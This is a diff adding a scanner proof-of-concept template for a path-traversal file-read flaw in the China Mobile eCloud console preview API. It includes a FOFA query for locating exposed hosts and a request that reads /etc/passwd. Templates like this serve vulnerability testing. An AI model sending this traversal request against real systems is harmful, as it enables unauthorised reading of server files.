@@ -1,0 +1,15 @@
+id: poc-yaml-ecloud-console-preview-anyfile-read
+info:
+  name: 中国移动云控制台 preview 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: ecloud
+  fofa: body="op-login-static/favicon.ico" || header="/oauth2/code/opgateway"
+requests:
+- method: GET
+  path: /api/query/helpcenter/api/v2/preview?fileName=../../../../../../../../etc/passwd
+  expression: "status_code == 200 && \ncontains(body,\"root:\") &&\ncontains(body,\"\
+    /bin\") &&\n!contains(body,\"<\") &&\ncontains(content_type,\"image/jpg\")\n"
+variables: {}
+transport: http
